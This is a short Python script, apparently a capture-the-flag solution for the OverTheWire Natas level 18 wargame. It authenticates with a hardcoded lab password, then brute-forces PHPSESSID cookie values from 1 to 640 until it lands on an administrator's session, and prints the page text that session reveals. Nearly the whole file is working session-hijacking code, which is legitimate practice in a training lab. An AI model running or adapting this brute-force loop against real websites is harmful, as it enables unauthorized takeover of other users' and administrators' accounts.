# PHP SessionID Bruteforce

import re
import requests
import colorama
from bs4 import BeautifulSoup
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Create a session and set the authorization credentials
session = requests.Session()


# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)


for i in range(1, 641):
    resp = session.get(url=url, cookies={"PHPSESSID": str(i)})

    if "You are an admin" in resp.text:
        soup = BeautifulSoup(resp.text, 'lxml')
        print(re.sub("View sourcecode", "", soup.div.text))
        break
    else:
        print(f"[-] Brute forcing PHPSESSID: {i}")
